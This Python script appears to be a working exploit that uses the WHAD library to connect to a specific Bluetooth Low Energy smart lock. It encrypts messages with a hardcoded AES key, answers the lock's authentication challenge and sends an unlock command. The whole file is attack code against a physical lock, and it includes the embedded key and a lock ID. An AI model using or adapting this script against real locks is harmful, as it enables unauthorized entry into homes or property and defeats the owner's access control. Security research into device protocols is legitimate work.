from whad.ble import Central
from whad.ble.profile import UUID
from whad.device import WhadDevice
from time import sleep
from struct import unpack,pack
from Crypto.Cipher import AES

key = "7b7079bb69001dce"
cipher = AES.new(key, AES.MODE_ECB)

def decrypt_message(message):
    global cipher
    decrypted = cipher.decrypt(message[2:])
    effective_length = unpack("<H",decrypted[:2])[0]
    decrypted = decrypted[:effective_length+2]
    return decrypted

def encrypt_message(message):
    global cipher
    print("[i] Transmitting message: ", message.hex())
    number_of_bytes = 16*(len(message) // 16) + 16
    padding = bytes([number_of_bytes - len(message)])
    while len(message) < number_of_bytes:
        message = message + padding
    encrypted = cipher.encrypt(message)
    return pack("<H", number_of_bytes) + encrypted

input_message = None
def on_input_fragment(characteristic, value, indication=False):
    global input_message
    print(">", value.hex())
    if input_message is None:
        input_message = value
    else:
        input_message += value
    if unpack("<H", input_message[:2])[0] == len(input_message[2:]):
        on_input_message(input_message)
        input_message = None

challenge = None
def on_input_message(message):
    global cipher, challenge
    decrypted_message =  decrypt_message(message)
    print("[i] Incoming message: ",decrypted_message.hex())
    if decrypted_message[2] == 0x01 and decrypted_message[3] == 0x00:
        challenge = decrypted_message[4:8]
        print("\t -> Extracted challenge:", challenge.hex())

def compute_challenge(value):
    number_of_bytes = 16*(len(value) // 16) + 16
    padding = bytes([number_of_bytes - len(value)])
    while len(value) < number_of_bytes:
        value = value + padding
    return cipher.encrypt(value)[:4]


def show(pkt):
    if hasattr(pkt, "metadata"):
        print(pkt.metadata, bytes(pkt).hex(), repr(pkt))

central = Central(WhadDevice.create('hci0'))
#central.attach_callback(show)
device = central.connect('A4:C1:38:22:01:64')
print("[i] Connected !")
# Discover
device.discover()
print("[i] Discovering services...")
for service in device.services():
    print('-- Service %s' % service.uuid)
    for charac in service.characteristics():
        print(' + Characteristic %s' % charac.uuid + "({})".format(hex(charac.value_handle)))

charac_fromlock = device.get_characteristic(UUID('1828'), UUID('2ADE'))

charac_fromlock.subscribe(
    notification=True,
    callback=on_input_fragment
)
lock_id = "526197"

charac_tolock = device.get_characteristic(UUID('1828'), UUID('2ADF'))
charac_tolock.value = encrypt_message(bytes.fromhex("060001000b9def63"))
print("[i] Waiting challenge...")
while challenge is None:
    sleep(0.1)
clear = bytes.fromhex("10001200") + compute_challenge(challenge) + bytes.fromhex("0e9def63") + lock_id.encode('utf-8')
data = encrypt_message(clear)
#print(clear.hex(), data.hex())

while len(data) > 0:
    device.write_command(0x8, data[:20])
    data = data[20:]

print("[i] Unlocking...")
unlock_message = encrypt_message(bytes.fromhex("040012000000"))
charac_tolock.write(unlock_message, without_response=True)

# Disconnect
device.disconnect()
central.stop()
central.close()
